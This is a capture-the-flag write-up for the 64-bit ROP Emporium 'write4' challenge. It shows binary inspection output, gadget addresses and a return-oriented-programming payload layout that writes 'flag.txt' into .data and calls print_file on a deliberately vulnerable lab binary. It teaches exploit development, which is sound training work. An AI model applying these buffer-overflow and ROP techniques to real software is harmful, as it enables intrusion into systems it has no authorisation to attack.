# write4

Similar story to the 32 bit except this is in 64 bit so the calling convention is different.

## First moves

We start by inspecting the binary.

`file`

```bash
└─$ file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
```

`checksec`

```bash
└─$ checksec --file=write4
[*] '/home/kali/my_challenges/pwn/ropemporium/03-write4/64bit/write4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```

## Lay of the land

Similar to the 32 bit version, we will user GDB, readelf and ropper to get some gadgets.

Infomation gathered:

```bash
0x0000000000400510  print_file@plt
0x0000000000601028 .data

# for setting up str
0x0000000000400690: pop r14; pop r15; ret;
0x0000000000400628: mov qword ptr [r14], r15; ret;

# for passing arg
0x0000000000400693: pop rdi; ret;
```

## Attack plan

1. Overflow the buffer
2. Have "flag.txt" stored in .data using gadgets
3. return to system with pointer to flag text.

Only difference from the 32bit writeup is only the way we're going to pass the argument in step 3.

## Exploit

This time we can fit the whole string in the registers since they can take up to 8 bytes.

Payload layout will look like:

```bash
padding
+ pop_r_gadget
+ data_address
+ "flag.txt"
+ mov_gadget
+ pop_rdi_gadget
+ data_address
+ print_file_address
+ optional exit address
```

### Pwntools

Check out `exploit.py` for the involved method and `exploit_rop.py` for an auto exploit.

The alternate solution can be done in this version too.
